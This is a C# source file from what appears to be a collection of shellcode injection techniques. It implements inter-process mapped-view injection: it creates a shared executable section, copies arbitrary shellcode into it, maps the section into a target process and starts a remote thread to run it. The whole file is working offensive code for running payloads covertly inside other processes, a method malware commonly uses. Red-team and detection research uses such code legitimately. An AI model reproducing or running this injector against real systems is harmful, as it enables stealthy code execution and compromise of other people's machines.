using System;
using System.Runtime.InteropServices;
using System.Diagnostics;

using static ShellcodeInjectionTechniques.Debugger;
using static ShellcodeInjectionTechniques.Native;

namespace ShellcodeInjectionTechniques
{
    class InterProcessMappedView : ITechnique
    {
        public void Run(Process target, byte[] shellcode)
        {
            IntPtr hSectionHandle = IntPtr.Zero;
            IntPtr pLocalView = IntPtr.Zero;
            UInt64 size = (UInt32)shellcode.Length;

            // create a new section to map view to
            UInt32 result = NtCreateSection(ref hSectionHandle, SectionAccess.SECTION_ALL_ACCESS, IntPtr.Zero, ref size, MemoryProtection.PAGE_EXECUTE_READWRITE, MappingAttributes.SEC_COMMIT, IntPtr.Zero);

            if (result != 0)
            {
                Debug("[!] Unable to map view of section: {0}", new string[] { ((NTSTATUS)result).ToString() });
                return;
            }
            else
                Debug("[+] NtCreateSection() - section handle: 0x{0}", new string[] { hSectionHandle.ToString("X") });

            // create a local view
            const UInt32 ViewUnmap = 0x2;
            UInt64 offset = 0;
            result = NtMapViewOfSection(hSectionHandle, (IntPtr)(-1), ref pLocalView, UIntPtr.Zero, UIntPtr.Zero, ref offset, ref size, ViewUnmap, 0, MemoryProtection.PAGE_READWRITE);

            if (result != 0)
            {
                Debug("[!] Unable to map view of section: {0}", new string[] { ((NTSTATUS)result).ToString() });
                return;
            }
            else
                Debug("[+] NtMapViewOfSection() - local view: 0x{0}", new string[] { pLocalView.ToString("X") });

            // copy shellcode to the local view
            Marshal.Copy(shellcode, 0, pLocalView, shellcode.Length);
            Debug("[+] Marshalling shellcode");

            // create a remote view of the section in the target
            IntPtr pRemoteView = IntPtr.Zero;
            NtMapViewOfSection(hSectionHandle, target.Handle, ref pRemoteView, UIntPtr.Zero, UIntPtr.Zero, ref offset, ref size, ViewUnmap, 0, MemoryProtection.PAGE_EXECUTE_READ);
            Debug("[+] NtMapViewOfSection() - remote view: 0x{0}", new string[] { pRemoteView.ToString("X") });

            // execute the shellcode
            IntPtr hThread = IntPtr.Zero;
            CLIENT_ID cid = new CLIENT_ID();
            RtlCreateUserThread(target.Handle, IntPtr.Zero, false, 0, IntPtr.Zero, IntPtr.Zero, pRemoteView, IntPtr.Zero, ref hThread, cid);
            Debug("[+] RtlCreateUserThread() - thread handle: 0x{0}", new string[] { hThread.ToString("X") });
        }
    }
}
